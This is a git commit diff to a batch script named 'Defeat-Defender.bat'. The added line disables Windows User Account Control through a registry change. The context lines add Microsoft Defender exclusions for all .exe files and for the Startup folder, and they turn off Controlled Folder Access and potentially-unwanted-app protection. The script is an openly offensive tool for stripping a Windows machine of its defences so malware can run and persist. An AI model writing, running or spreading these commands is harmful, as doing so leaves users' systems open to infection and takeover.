3c6f95f100c79fe0c152c1dfdcfcee294d5ec63e
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-06-07 02:22:39 +0530

    Update Defeat-Defender.bat

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -44,6 +44,8 @@ powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
+powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
